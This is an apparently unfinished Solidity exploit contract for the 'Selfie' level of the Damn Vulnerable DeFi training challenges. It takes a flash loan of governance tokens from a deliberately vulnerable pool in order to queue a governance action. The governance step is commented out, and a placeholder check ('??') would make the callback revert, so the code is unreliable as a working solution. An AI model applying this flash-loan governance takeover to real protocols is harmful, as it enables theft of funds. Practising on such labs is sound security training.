pragma solidity =0.8.25;

import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract ExploitContract {
    SelfiePool public immutable pool;
    DamnValuableVotes public immutable vote;
    SimpleGovernance public immutable governance;

    constructor(SelfiePool _pool, DamnValuableVotes _vote, SimpleGovernance _governance) {
        pool = _pool;
        vote = _vote;
        governance = _governance;
    }

    function run() public {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(vote), 1_500_000e18, bytes(""));
        // token.transferFrom(address(pool), target, 1_000_000e18);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {
        // // create an action...?
        // governance.queueAction(
        //     address(pool),
        //     0,
        //     abi.encodeWithSelector(pool.flashLoan.selector, IERC3156FlashBorrower(address(this)), address(vote), 1_500_000e18, bytes(""))
        // );
        require(vote.getVotes(address(this)) == 0x123, "??");

        // approving the return
        ERC20(token).approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
